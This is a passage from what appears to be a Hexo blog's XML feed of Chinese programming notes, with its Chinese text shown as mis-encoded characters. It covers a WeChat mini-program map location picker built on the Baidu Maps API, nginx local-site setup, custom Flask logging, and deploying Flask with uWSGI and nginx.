currentRegion: data.originalData.result.addressComponent,</span><br><span class="line">      &#125;);</span><br><span class="line">      let location &#x3D; wxMarkerData.latitude + &#39;,&#39; + wxMarkerData.longitude;</span><br><span class="line">      that.nearby_search(wxMarkerData.address, location);</span><br><span class="line">    &#125;;</span><br><span class="line">    &#x2F;&#x2F;&amp;&amp; (e.causedBy &#x3D;&#x3D; &#39;scale&#39; || e.causedBy &#x3D;&#x3D; &#39;drag&#39;)</span><br><span class="line">    if (e.type &#x3D;&#x3D; &#39;end&#39; &amp;&amp; (e.causedBy &#x3D;&#x3D; &#39;scale&#39; || e.causedBy &#x3D;&#x3D; &#39;drag&#39;)) &#123;</span><br><span class="line">      &#x2F;*ç”¨ä¸€ä¸ªè½®è¯¢åˆ¤æ–­getlocationæ˜¯å¦æ‰§è¡Œå®Œ,</span><br><span class="line">        ä¿è¯å®šä½å®Œå†æ‰§è¡Œmapchange,</span><br><span class="line">        ä¸»è¦æ˜¯è§£å†³mapç»„ä»¶åˆå§‹åŒ–æ—¶ä¼šå› ä¸ºscaleæ”¹å˜è§¦å‘ä¸€æ¬¡å½“å‰å‡½æ•° </span><br><span class="line">      *&#x2F;</span><br><span class="line">      let i &#x3D; setInterval(function () &#123;</span><br><span class="line">        let &#123;</span><br><span class="line">          isGet</span><br><span class="line">        &#125; &#x3D; that.data;</span><br><span class="line">        if (isGet) &#123;</span><br><span class="line">          clearInterval(i);</span><br><span class="line">          &#x2F;&#x2F;å…ˆè°ƒç”¨å¾®ä¿¡ç»„ä»¶è·å–åœ°å›¾ä¸­å¿ƒç‚¹ä½ç½®ç»çº¬åº¦</span><br><span class="line">          that.mapCtx.getCenterLocation(&#123;</span><br><span class="line">            success: function (res) &#123;</span><br><span class="line">              &#x2F;&#x2F; console.log(res)</span><br><span class="line">              that.setData(&#123;</span><br><span class="line">                nearList: [],</span><br><span class="line">                latitude: res.latitude,</span><br><span class="line">                longitude: res.longitude,</span><br><span class="line">              &#125;);</span><br><span class="line">              &#x2F;&#x2F;ç™¾åº¦é€†åœ°å€è§£æ,å°†ç»çº¬åº¦è½¬æ¢ä¸ºåœ°å€ä¿¡æ¯</span><br><span class="line">              BMap.regeocoding(&#123;</span><br><span class="line">                location: res.latitude + &#39;,&#39; + res.longitude,</span><br><span class="line">                fail: fail,</span><br><span class="line">                success: success,</span><br><span class="line">              &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;, 500)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#x2F;&#x2F;é‡æ–°å®šä½</span><br><span class="line">  reload: function () &#123;</span><br><span class="line">    this.onLoad();</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  onShow: function () &#123;</span><br><span class="line"></span><br><span class="line">  &#125;,</span><br><span class="line">  &#x2F;&#x2F; æ ¹æ®å…³é”®è¯æœç´¢é™„è¿‘ä½ç½®</span><br><span class="line">  nearby_search: function (addressName, location) &#123;</span><br><span class="line">    let that &#x3D; this;</span><br><span class="line">    &#x2F;*å‘èµ·POIæ£€ç´¢è¯·æ±‚,æœç´¢å½“å‰ä½ç½®é™„è¿‘åœ°å€ä¿¡æ¯</span><br><span class="line">      å¦‚æœä¸çŸ¥é“å‚æ•°å¯ä»¥é€šè¿‡ctrl+é¼ æ ‡å·¦é”®è¿›å…¥ç±»å†…éƒ¨æŸ¥çœ‹æ–¹æ³• </span><br><span class="line">    *&#x2F;</span><br><span class="line">    BMap.search(&#123;</span><br><span class="line">      &quot;query&quot;: addressName || &#39;æˆ¿åœ°äº§&#39;,</span><br><span class="line">      location: location,</span><br><span class="line">      page_size: 20,</span><br><span class="line">      page_index: 1,</span><br><span class="line">      success: function (res) &#123;</span><br><span class="line">        &#x2F;&#x2F; console.log(res);</span><br><span class="line">        let sug &#x3D; [];</span><br><span class="line">        let wxMarkerData &#x3D; res.wxMarkerData;</span><br><span class="line">        &#x2F;&#x2F; console.log(wxMarkerData)</span><br><span class="line">        for (let i of wxMarkerData) &#123;</span><br><span class="line">          &#x2F;&#x2F; console.log(i)</span><br><span class="line">          sug.push(&#123; &#x2F;&#x2F; è·å–è¿”å›ç»“æœï¼Œæ”¾åˆ°sugæ•°ç»„ä¸­</span><br><span class="line">            title: i.title,</span><br><span class="line">            id: i.id,</span><br><span class="line">            addr: i.address,</span><br><span class="line">            latitude: i.latitude,</span><br><span class="line">            longitude: i.longitude</span><br><span class="line">          &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        if (sug.length &gt; 0) &#123;</span><br><span class="line">          that.setData(&#123;</span><br><span class="line">            selectedId: 0,</span><br><span class="line">            centerData: sug[0],</span><br><span class="line">            nearList: sug,</span><br><span class="line">          &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      fail(err) &#123;</span><br><span class="line">        console.log(err)</span><br><span class="line">        wx.hideLoading(&#123;&#125;);</span><br><span class="line">        wx.showToast(&#123;</span><br><span class="line">          title: &#39;è·å–é™„è¿‘åœ°å€ä¿¡æ¯å¤±è´¥&#39;,</span><br><span class="line">          icon: &#39;none&#39;,</span><br><span class="line">          duration: 1500</span><br><span class="line">        &#125;)</span><br><span class="line">        setTimeout(function () &#123;</span><br><span class="line">          wx.navigateBack(&#123;</span><br><span class="line">            delta: 1</span><br><span class="line">          &#125;)</span><br><span class="line">        &#125;, 1500)</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F;æ˜¾ç¤ºæœç´¢åˆ—è¡¨</span><br><span class="line">  showAddList: function () &#123;</span><br><span class="line">    this.setData(&#123;</span><br><span class="line">      addListShow: true</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;,</span><br><span class="line">  &#x2F;&#x2F;æ ¹æ®å…³é”®è¯æœç´¢åŒ¹é…ä½ç½®</span><br><span class="line">  getsuggest: function (ev) &#123;</span><br><span class="line">    let that &#x3D; this;</span><br><span class="line">    that.setData(&#123;</span><br><span class="line">      addListShow: true</span><br><span class="line">    &#125;)</span><br><span class="line">    let keyWold &#x3D; ev.detail.value.trim(),</span><br><span class="line">      &#123;</span><br><span class="line">        currentRegion</span><br><span class="line">      &#125; &#x3D; that.data,</span><br><span class="line">      searchCity &#x3D; currentRegion.city;</span><br><span class="line"></span><br><span class="line">    if (keyWold !&#x3D; &quot;&quot;) &#123;</span><br><span class="line">      &#x2F;* æ ¹æ®è¾“å…¥çš„å…³é”®å­—,åœ¨å½“å‰åŸå¸‚æœç´¢å…³é”®å­—åœ°å€ä¿¡æ¯ *&#x2F;</span><br><span class="line">      BMap.suggestion(&#123;</span><br><span class="line">        query: keyWold,</span><br><span class="line">        region: searchCity, &#x2F;&#x2F;å¸‚</span><br><span class="line">        city_limit: true,</span><br><span class="line">        &#x2F;&#x2F; æœç´¢ç»“æœå¤„ç†</span><br><span class="line">        success: res &#x3D;&gt; &#123;</span><br><span class="line">          let newList &#x3D; res.result.filter(item &#x3D;&gt; &#123;</span><br><span class="line">            return item.location;</span><br><span class="line">          &#125;);</span><br><span class="line">          &#x2F;&#x2F; console.log(newList)</span><br><span class="line">          that.setData(&#123;</span><br><span class="line">            nearList: newList,</span><br><span class="line">          &#125;);</span><br><span class="line">        &#125;,</span><br><span class="line">        fail(err) &#123;</span><br><span class="line">          console.log(err)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      if (!that.data.addListShow) &#123;</span><br><span class="line">        that.setData(&#123;</span><br><span class="line">          addListShow: true</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F;ç‚¹å‡»é€‰æ‹©åœ°å›¾ä¸‹æ–¹åˆ—è¡¨æŸé¡¹</span><br><span class="line">  chooseCenter: function (e) &#123;</span><br><span class="line">    let that &#x3D; this;</span><br><span class="line">    let id &#x3D; e.currentTarget.id;</span><br><span class="line">    let nearList &#x3D; that.data.nearList;</span><br><span class="line">    that.setData(&#123;</span><br><span class="line">      selectedId: id,</span><br><span class="line">      centerData: nearList[id],</span><br><span class="line">      latitude: nearList[id].latitude,</span><br><span class="line">      longitude: nearList[id].longitude,</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F;ç‚¹å‡»é€‰æ‹©æœç´¢ç»“æœ</span><br><span class="line">  backfill: function (e) &#123;</span><br><span class="line">    let that &#x3D; this;</span><br><span class="line">    let id &#x3D; e.currentTarget.id;</span><br><span class="line">    let nearList &#x3D; that.data.nearList;</span><br><span class="line">    that.setData(&#123;</span><br><span class="line">      selectedId: id,</span><br><span class="line">      centerData: nearList[id],</span><br><span class="line">      addListShow: false,</span><br><span class="line">      latitude: nearList[id].latitude,</span><br><span class="line">      longitude: nearList[id].longitude</span><br><span class="line">    &#125;);</span><br><span class="line">    &#x2F;&#x2F; é€‰æ‹©å®Œè¿”å›åœ°å›¾é¡µé¢</span><br><span class="line">    &#x2F;&#x2F; let location &#x3D; nearList[id].latitude + &#39;,&#39; + nearList[id].longitude;</span><br><span class="line">    &#x2F;&#x2F; that.nearby_search(nearList[id].title, location);</span><br><span class="line">    &#x2F;&#x2F; console.log(that.data.centerData)</span><br><span class="line">    &#x2F;&#x2F;é€‰æ‹©å®Œè¿”å›ä¸Šä¸€é¡µ</span><br><span class="line">    wx.navigateBack(&#123;</span><br><span class="line">      delta: 1</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F;è¿”å›ä¸Šä¸€é¡µæˆ–å…³é—­æœç´¢é¡µé¢</span><br><span class="line">  back1: function () &#123;</span><br><span class="line">    wx.navigateBack(&#123;</span><br><span class="line">      delta: 1</span><br><span class="line">    &#125;)</span><br><span class="line">    &#x2F;&#x2F; if (this.data.addListShow) &#123;</span><br><span class="line">    &#x2F;&#x2F;   this.setData(&#123;</span><br><span class="line">    &#x2F;&#x2F;     addListShow: false</span><br><span class="line">    &#x2F;&#x2F;   &#125;)</span><br><span class="line">    &#x2F;&#x2F; &#125;</span><br><span class="line">    &#x2F;&#x2F;è¿”å›ä¸Šä¸€é¡µ</span><br><span class="line">    &#x2F;&#x2F; else &#123;</span><br><span class="line">    &#x2F;&#x2F;   wx.navigateBack(&#123;</span><br><span class="line">    &#x2F;&#x2F;     delta: 1</span><br><span class="line">    &#x2F;&#x2F;   &#125;)</span><br><span class="line">    &#x2F;&#x2F; &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#x2F;&#x2F;ç¡®è®¤é€‰æ‹©åœ°å€</span><br><span class="line">  selectedOk: function () &#123;</span><br><span class="line">    console.log(this.data.centerData)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://blog.csdn.net/yu17310133443/article/details/88991021">å¾®ä¿¡å°ç¨‹åºâ€”â€”æ‰“å¼€åœ°å›¾ é€‰æ‹©ä½ç½® å®Œæ•´åŠŸèƒ½å®ç°ä»£ç (å®šä½ï¼Œæ£€ç´¢å‘¨è¾¹ï¼Œå¯ç§»åŠ¨é€‰ç‚¹ï¼Œå¯æœç´¢ï¼Œè…¾è®¯åœ°å›¾API)</a></p>
<p><a href="https://github.com/yanmymickey/Baidumap">ä»£ç GitHubâ€”â€”å¾®ä¿¡å°ç¨‹åºç™¾åº¦åœ°å›¾APIç§»åŠ¨é€‰ç‚¹</a></p>
]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>Note</tag>
        <tag>wechatweb</tag>
      </tags>
  </entry>
  <entry>
    <title>é…ç½®æœ¬åœ°ç«™ç‚¹æ–¹æ³•</title>
    <url>/2020/11/05/Note/%E9%85%8D%E7%BD%AE%E6%9C%AC%E5%9C%B0%E7%AB%99%E7%82%B9%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<h1 id="é…ç½®æœ¬åœ°ç«™ç‚¹æ–¹æ³•"><a href="#é…ç½®æœ¬åœ°ç«™ç‚¹æ–¹æ³•" class="headerlink" title="é…ç½®æœ¬åœ°ç«™ç‚¹æ–¹æ³•"></a>é…ç½®æœ¬åœ°ç«™ç‚¹æ–¹æ³•</h1><h2 id="ç¬¬ä¸€æ­¥"><a href="#ç¬¬ä¸€æ­¥" class="headerlink" title="ç¬¬ä¸€æ­¥"></a>ç¬¬ä¸€æ­¥</h2><p>ä¿®æ”¹nginxé…ç½®æ–‡ä»¶,å¯ä»¥é€‰æ‹©å¤šç«¯å£å¤šç«™ç‚¹,æˆ–è€…80ç«¯å£å¤šç«™ç‚¹,ä¸€èˆ¬åªéœ€ä¿®æ”¹<code>server_name</code>å’Œ<code>root</code></p>
<a id="more"></a>

<h2 id="ç¬¬äºŒæ­¥"><a href="#ç¬¬äºŒæ­¥" class="headerlink" title="ç¬¬äºŒæ­¥"></a>ç¬¬äºŒæ­¥</h2><p>åŒæ­¥hosts,åœ¨hostsæ–‡ä»¶é‡Œé¢æ·»åŠ æœ¬åœ°ç«™ç‚¹</p>
]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>Note</tag>
      </tags>
  </entry>
  <entry>
    <title>flaskè‡ªå®šä¹‰æ—¥å¿—</title>
    <url>/2020/08/06/Note/flask%E8%87%AA%E5%AE%9A%E4%B9%89%E6%97%A5%E5%BF%97/</url>
    <content><![CDATA[<h1 id="flaskè‡ªå®šä¹‰æ—¥å¿—"><a href="#flaskè‡ªå®šä¹‰æ—¥å¿—" class="headerlink" title="flaskè‡ªå®šä¹‰æ—¥å¿—"></a>flaskè‡ªå®šä¹‰æ—¥å¿—</h1><h2 id="logger"><a href="#logger" class="headerlink" title="logger"></a>logger</h2><p>é¦–å…ˆæˆ‘ä»¬è¦äº†è§£pythonå®ç°è®°å½•ç¨‹åºæ—¥å¿—åŠŸèƒ½å¯ä»¥ä½¿ç”¨loggingæ¨¡å—ï¼Œå…³äºloggingçš„ç”¨æ³•ï¼Œç»§æ‰¿ç±»è‡ªå®šä¹‰æ—¥å¿—ï¼Œæ—¥å¿—ç­‰çº§ï¼Œç­‰ç­‰ã€‚</p>
<p>æ—¥å¿—è¾“å‡ºåˆ°æ–‡ä»¶ï¼Œç”¨FileHandlerï¼ŒRotatingFileHandler</p>
<a id="more"></a>

<h2 id="app-logger"><a href="#app-logger" class="headerlink" title="app.logger"></a>app.logger</h2><p>çœ‹çœ‹app.loggeræºç </p>
<p><a href="https://blogjpg.yanmy.top/blog/20200806155213.png"><img src="https://blogjpg.yanmy.top/blog/20200806155213.png" alt="image-20200806155213786"></a></p>
<p><a href="https://blogjpg.yanmy.top/blog/20200806155326.png"><img src="https://blogjpg.yanmy.top/blog/20200806155326.png" alt="image-20200806155326597"></a></p>
<p>å¾—åˆ°å‡ ç‚¹ä¿¡æ¯</p>
<ul>
<li>åœ¨åˆå§‹åŒ–appæ—¶,ä¾¿åˆ›å»ºäº†ä¸€ä¸ªapp.nameçš„æ—¥å¿—è®°å½•å™¨,å…¶æ˜¯ç»§æ‰¿äºpythonçš„loggingæ¨¡å—çš„</li>
<li>è¯¥è®°å½•å™¨å·²ç»æ·»åŠ ä¸€ä¸ªdefault_handler</li>
</ul>
<p>å†™ä¸€ä¸ªå°åŠŸèƒ½:flaskå®ç°ç±»ä¼¼nginxçš„access.log</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from flask import Flask, request</span><br><span class="line">from flask.logging import default_handler</span><br><span class="line">from logging import Formatter, INFO</span><br><span class="line">from logging.handlers import RotatingFileHandler</span><br><span class="line"></span><br><span class="line">app &#x3D; Flask(__name__)</span><br><span class="line">app.debug &#x3D; True</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ä¸»è·¯ç”±index page</span><br><span class="line">@app.route(&#39;&#x2F;&#39;, methods&#x3D;[&#39;Get&#39;])</span><br><span class="line">def index():</span><br><span class="line">    return &quot;hello&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># åœ¨æ¯ä¸€æ¬¡è¯·æ±‚å‰æ‰§è¡Œ</span><br><span class="line">@app.before_request</span><br><span class="line">def log_each_request():</span><br><span class="line">    params &#x3D; request.args if request.args is None else &#39;&#39;</span><br><span class="line">    app.logger.info(&#39;&#123;&#125;-&#123;&#125;-&#123;&#125;&#39;.format(request.method, request.path, params))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    # æ—¥å¿—æ ¼å¼åŒ–ç±»            è®°å½•æ—¶é—´      ç­‰çº§               ä»£ç è¡Œ        æ—¥å¿—ä¿¡æ¯</span><br><span class="line">    formatter &#x3D; Formatter(&#39;%(asctime)s  - %(levelname)s - %(lineno)d - %(message)s&#39;)</span><br><span class="line">    info_log_path &#x3D; &#39;logs&#x2F;flask.log&#39;</span><br><span class="line">    # è‡ªåŠ¨åˆ†å‰²æ—¥å¿—åŠŸèƒ½çš„Handler</span><br><span class="line">    file_handler &#x3D; RotatingFileHandler(info_log_path, maxBytes&#x3D;10 * 1024 * 1024, backupCount&#x3D;10)</span><br><span class="line">    file_handler.setFormatter(formatter)</span><br><span class="line">    file_handler.setLevel(INFO)</span><br><span class="line">    if not app.debug:</span><br><span class="line">        app.logger.removeHandler(default_handler)</span><br><span class="line">        app.logger.addHandler(file_handler)</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
<p><a href="https://blogjpg.yanmy.top/blog/20200806160238.png"><img src="https://blogjpg.yanmy.top/blog/20200806160238.png" alt="image-20200806160238707"></a></p>
<p>å¦‚æœæˆ‘ä»¬å°†è¿™è¡Œä»£ç æ³¨é‡Šæ‰</p>
<ul>
<li>app.debug=Trueçš„æƒ…å†µä¸‹ï¼Œæ—¥å¿—å¯ä»¥è¾“å‡ºï¼Œä½†æ˜¯ä¼šå°†æ§åˆ¶å°æ‰€æœ‰çš„ä¿¡æ¯éƒ½è¾“å‡ºåˆ°æ—¥å¿—æ–‡ä»¶ï¼Œè¿™æ˜¯æˆ‘ä»¬ä¸æƒ³çš„ï¼Œæˆ‘ä»¬åªæƒ³è¦app.logger.infoå†™çš„å†…å®¹ã€‚</li>
<li>app.debug=Falseçš„æƒ…å†µä¸‹ï¼Œæ—¥å¿—ä¸å·¥ä½œäº†ï¼Œä¹‹å‰è¿˜èƒ½å…¨éƒ¨è¾“å‡ºåªæ˜¯æœ‰äº›æ˜¯æˆ‘ä»¬ä¸æƒ³è¦çš„ï¼Œç°åœ¨éƒ½æ²¡äº†ï¼Œå°±å¥½åƒå¥³æœ‹å‹è¯´åˆ†æ‰‹å°±åˆ†æ‰‹ã€‚</li>
</ul>
<h3 id="Whyï¼Ÿ"><a href="#Whyï¼Ÿ" class="headerlink" title="Whyï¼Ÿ"></a>Whyï¼Ÿ</h3><p>è·Ÿè¿›default_handler</p>
<p><a href="https://blogjpg.yanmy.top/blog/20200806161324.png"><img src="https://blogjpg.yanmy.top/blog/20200806161324.png" alt="image-20200806161324214"></a></p>
<p>default_handleræ˜¯ä¸€ä¸ªStreamHandlerï¼Œå°†æ—¥å¿—è®°å½•è¾“å‡ºå‘é€åˆ°æµï¼Œä¾‹å¦‚<em>sys.stdout</em>ï¼Œ<em>sys.stderr</em>æˆ–ä»»ä½•ç±»ä¼¼æ–‡ä»¶çš„å¯¹è±¡ï¼ˆæˆ–æ›´å‡†ç¡®åœ°è¯´ï¼Œæ˜¯æ”¯æŒ<code>write()</code> å’Œ<code>flush()</code>æ–¹æ³•çš„ä»»ä½•å¯¹è±¡ï¼‰</p>
<p>æ‰€ä»¥æ§åˆ¶å°çš„è¾“å‡ºä¹Ÿä¼šä¸€èµ·è¾“å‡ºè‡³ä½ çš„æ–‡ä»¶äº†</p>
<p>app.debugé—®é¢˜ï¼šåº”ç”¨ç¨‹åºæ§åˆ¶å°ä¸­çœ‹åˆ°çš„è¾“å‡ºæ¥è‡ªåº•å±‚çš„Werkzeugè®°å½•å™¨ï¼Œæ²¡æœ‰è®¾ç½®logleveï¼Œæ—¥å¿—å°±æ²¡æœ‰äº†ã€‚</p>
<h2 id="ç„¶å"><a href="#ç„¶å" class="headerlink" title="ç„¶å"></a>ç„¶å</h2><p>ç„¶åï¼Œç„¶åå¹²å˜›ï¼Ÿ</p>
<p>ç„¶åå°±å»ç©å‘€ğŸ˜</p>
]]></content>
      <categories>
        <category>Note</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Note</tag>
        <tag>python</tag>
        <tag>flask</tag>
      </tags>
  </entry>
  <entry>
    <title>éƒ¨ç½²nginx+uwsgi+flask</title>
    <url>/2020/08/06/Note/%E9%83%A8%E7%BD%B2nginx+uwsgi+flask/</url>
    <content><![CDATA[<h1 id="éƒ¨ç½²nginx-uwsgi-flask"><a href="#éƒ¨ç½²nginx-uwsgi-flask" class="headerlink" title="éƒ¨ç½²nginx+uwsgi+flask"></a>éƒ¨ç½²nginx+uwsgi+flask</h1><h2 id="æœåŠ¡å™¨é…ç½®"><a href="#æœåŠ¡å™¨é…ç½®" class="headerlink" title="æœåŠ¡å™¨é…ç½®"></a>æœåŠ¡å™¨é…ç½®</h2><p>Centos7.6</p>
<p>python3.7</p>
<p>nginx 1.12</p>
<a id="more"></a>

<h2 id="é¡¹ç›®æ–‡ä»¶"><a href="#é¡¹ç›®æ–‡ä»¶" class="headerlink" title="é¡¹ç›®æ–‡ä»¶"></a>é¡¹ç›®æ–‡ä»¶</h2><p>é¡¹ç›®æ–‡ä»¶æœ€å¥½æ”¾åœ¨ä¸€ä¸ªæƒé™è¾ƒä½çš„ç›®å½•ï¼Œå½“ç„¶ï¼Œé…ç½®å¥½æƒé™ä¹Ÿæ˜¯å¯ä»¥çš„</p>
<p>å°†flaské¡¹ç›®é€šè¿‡ftpæˆ–è€…gitä¸Šä¼ åˆ°/home/project</p>
<h2 id="uwsgi"><a href="#uwsgi" class="headerlink" title="uwsgi"></a>uwsgi</h2><h3 id="è™šæ‹Ÿç¯å¢ƒ"><a href="#è™šæ‹Ÿç¯å¢ƒ" class="headerlink" title="è™šæ‹Ÿç¯å¢ƒ"></a>è™šæ‹Ÿç¯å¢ƒ</h3><p>ä»€ä¹ˆæ˜¯è™šæ‹Ÿç¯å¢ƒ?</p>
<p><a href="https://www.liaoxuefeng.com/wiki/1016959663602400/1019273143120480">virtualenv - å»–é›ªå³°</a></p>
<p>ç®€è€Œè¨€ä¹‹å°±æ˜¯å°†å½“å‰é¡¹ç›®éœ€è¦ç”¨åˆ°çš„ä¸€äº›ç¬¬ä¸‰æ–¹åº“åˆ†å¼€å­˜å‚¨ï¼Œä¸ç›´æ¥æ”¾ç½®åˆ°ç³»ç»Ÿç›®å½•ï¼Œè¿™æ ·å¯ä»¥ä¿è¯ç¯å¢ƒçš„ç‹¬ç«‹æ€§å’Œç¨³å®šæ€§ï¼Œç³»ç»Ÿç›®å½•ä¸­çš„åº“å‡çº§ä¸ä¼šå½±å“åˆ°é¡¹ç›®ã€‚</p>
<h4 id="æ–°å»ºè™šæ‹Ÿç¯å¢ƒ"><a href="#æ–°å»ºè™šæ‹Ÿç¯å¢ƒ" class="headerlink" title="æ–°å»ºè™šæ‹Ÿç¯å¢ƒ"></a>æ–°å»ºè™šæ‹Ÿç¯å¢ƒ</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># å®‰è£…</span><br><span class="line">pip3 install virtualenv</span><br><span class="line"># è¿›å…¥é¡¹ç›®ç›®å½•</span><br><span class="line">cd &#x2F;home&#x2F;project</span><br><span class="line"># æ›´æ”¹ç›®å½•æ‰€æœ‰è€…</span><br><span class="line">sudo chown -R yourUserName:yourUserName é¡¹ç›®è·¯å¾„&#x2F;</span><br><span class="line">cd é¡¹ç›®è·¯å¾„&#x2F;</span><br><span class="line"># æ–°å»ºè™šæ‹Ÿç¯å¢ƒï¼Œä¿å­˜å½“å‰é¡¹ç›®æ‰€éœ€ä¾èµ– </span><br><span class="line">sudo virtualenv venv</span><br></pre></td></tr></table></figure>
<h4 id="è¿›å…¥è™šæ‹Ÿç¯å¢ƒ"><a href="#è¿›å…¥è™šæ‹Ÿç¯å¢ƒ" class="headerlink" title="è¿›å…¥è™šæ‹Ÿç¯å¢ƒ"></a>è¿›å…¥è™šæ‹Ÿç¯å¢ƒ</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">source venv&#x2F;bin&#x2F;activate</span><br></pre></td></tr></table></figure>
<h4 id="å®‰è£…ä¾èµ–"><a href="#å®‰è£…ä¾èµ–" class="headerlink" title="å®‰è£…ä¾èµ–"></a>å®‰è£…ä¾èµ–</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># è™šæ‹Ÿç¯å¢ƒä¸­å°±ä¸è¦ç”¨sudoäº†ï¼Œä¸ç„¶åˆæ˜¯è°ƒç”¨ç³»ç»Ÿç›®å½•çš„pipäº†</span><br><span class="line"># åœ¨è™šæ‹Ÿç¯å¢ƒä¸­å®‰è£…é¡¹ç›®æ‰€éœ€ä¾èµ–</span><br><span class="line">pip install -r requirements.txt</span><br><span class="line"># åœ¨è™šæ‹Ÿç¯å¢ƒä¸­å®‰è£… uwsgi å’Œ uwsgiçš„çŠ¶æ€ç›‘æ§å™¨</span><br><span class="line">pip install uwsgi uwsgitop</span><br></pre></td></tr></table></figure>
<h3 id="ç¼–å†™uwsgié…ç½®æ–‡ä»¶"><a href="#ç¼–å†™uwsgié…ç½®æ–‡ä»¶" class="headerlink" title="ç¼–å†™uwsgié…ç½®æ–‡ä»¶"></a>ç¼–å†™uwsgié…ç½®æ–‡ä»¶</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim uwsgi.ini</span><br><span class="line">[uwsgi]</span><br><span class="line"># python å¯åŠ¨ç¨‹åºæ–‡ä»¶ app.runæ‰€åœ¨çš„æ–‡ä»¶å</span><br><span class="line">wsgi-file &#x3D; </span><br><span class="line"></span><br><span class="line"># python ç¨‹åºå†…ç”¨ä»¥å¯åŠ¨çš„å˜é‡å app</span><br><span class="line">callable &#x3D; app</span><br><span class="line"></span><br><span class="line"># è¿›ç¨‹æ•°</span><br><span class="line">processes &#x3D; 5</span><br><span class="line"></span><br><span class="line"># çº¿ç¨‹æ•°</span><br><span class="line">threads &#x3D; 2</span><br><span class="line"></span><br><span class="line">#ä¸»è¿›ç¨‹</span><br><span class="line">master&#x3D;true</span><br><span class="line"></span><br><span class="line"># æŒ‡å‘ç½‘ç«™ç›®å½•</span><br><span class="line">chdir&#x3D;&#x2F;home&#x2F;project&#x2F;é¡¹ç›®è·¯å¾„&#x2F;</span><br><span class="line"></span><br><span class="line"># socketæ–‡ä»¶ï¼Œé…ç½®nginxæ—¶å€™ä½¿ç”¨ </span><br><span class="line"># ä¹Ÿå¯ä»¥å†™å‡ºip:portç«¯å£æ¨¡å¼</span><br><span class="line"># æ¯”å¦‚ 127.0.0.1:5001</span><br><span class="line"># ç«¯å£æ¨¡å¼çš„è¯nginxä¹Ÿè¦ä¸€ä¸ªç«¯å£,å°±æŒºå•°å—¦çš„</span><br><span class="line">socket&#x3D;%(chdir)&#x2F;uwsgi&#x2F;uwsgi.sock            </span><br><span class="line">chmod-socket&#x3D;666</span><br><span class="line">#httpæ¨¡å¼,ä¸éœ€è¦é…åˆnginxå³å¯å•ç‹¬ä½¿ç”¨</span><br><span class="line">#ä½†æ˜¯nginxæ˜¯cç¼–å†™çš„,è§£æhttpè¯·æ±‚çš„æ•ˆç‡è¦é«˜å¾ˆå¤š</span><br><span class="line">#å»ºè®®ä½¿ç”¨socketåŠ nginxçš„æ¨¡å¼</span><br><span class="line">#http&#x3D;0.0.0.0:5001</span><br><span class="line"></span><br><span class="line"># statusæ–‡ä»¶ï¼Œå¯ä»¥æŸ¥çœ‹uwsgiçš„è¿è¡ŒçŠ¶æ€</span><br><span class="line">stats&#x3D;%(chdir)&#x2F;uwsgi&#x2F;uwsgi.status            </span><br><span class="line"># pidæ–‡ä»¶ï¼Œé€šè¿‡è¯¥æ–‡ä»¶å¯ä»¥æ§åˆ¶uwsgiçš„é‡å¯å’Œåœæ­¢ </span><br><span class="line">pidfile&#x3D;%(chdir)&#x2F;uwsgi&#x2F;uwsgi.pid            </span><br><span class="line"># æ—¥å¿—æ–‡ä»¶ï¼Œé€šè¿‡è¯¥æ–‡ä»¶æŸ¥çœ‹uwsgiåå°è¿è¡Œçš„æ—¥å¿—</span><br><span class="line">daemonize&#x3D;%(chdir)&#x2F;uwsgi&#x2F;uwsgi.log   </span><br><span class="line">logfile-chmod&#x3D;644</span><br><span class="line"></span><br><span class="line"># uid&#x3D;</span><br><span class="line"># gid&#x3D;</span><br><span class="line"># uwsgiçš„è¿›ç¨‹åç§°å‰ç¼€</span><br><span class="line"># procname-prefix-spaced&#x3D;mysite                </span><br><span class="line"></span><br><span class="line"># pyæ–‡ä»¶ä¿®æ”¹è‡ªåŠ¨åŠ è½½,ç”Ÿæˆç¯å¢ƒä¸å»ºè®®å¼€å¯</span><br><span class="line">#py-autoreload&#x3D;true </span><br><span class="line"></span><br><span class="line">buffer-size &#x3D; 32768</span><br></pre></td></tr></table></figure>
